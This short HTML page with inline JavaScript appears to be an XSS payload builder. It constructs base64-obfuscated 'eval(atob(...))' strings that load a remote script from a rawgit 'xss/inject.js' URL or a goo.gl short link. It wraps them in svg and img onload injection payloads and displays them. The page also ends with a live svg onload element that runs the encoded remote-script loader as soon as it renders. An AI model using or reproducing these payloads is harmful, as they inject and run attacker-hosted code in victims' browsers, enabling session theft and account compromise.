<body>
	<p>Final paylaod1 : <span id="final1"> Value</span><p>
	<p>Final paylaod2 : <span id="final2"> Value</span><p>
<body>
<script type="text/javascript">
		url = "https://rawgit.com/navneetkumar/xss/master/inject.js";
		shorturl = "https://goo.gl/hKNba7";
		nativeScript = "s=document.createElement('script');" + "s.src='" + url + "';" + "document.head.appendChild(s)";
		jqueryScript = "$.getScript('" + shorturl + "')";
		nativeEncoded = btoa(nativeScript);
		jqueryEncoded = btoa(jqueryScript);
		finalExecutable = "eval(atob('" + jqueryEncoded + "'))";
		finalPayload1 = "<svg/onload=" + finalExecutable + ">";
		finalPayload2 = "<img src='a' onload=" + finalExecutable + ">";
		console.log("Final eval string = ",finalExecutable);
		console.log("Final Firefox payload string = ",finalPayload1);
		console.log("Final Firefox+Safari payload string = ",finalPayload2);
		$("#final1").text(finalPayload1);
		$("#final2").text(finalPayload2);
</script>
		
<div class="page-title text-dark">Remote Script<svg/onload=eval(atob(nativeEncoded));></div>
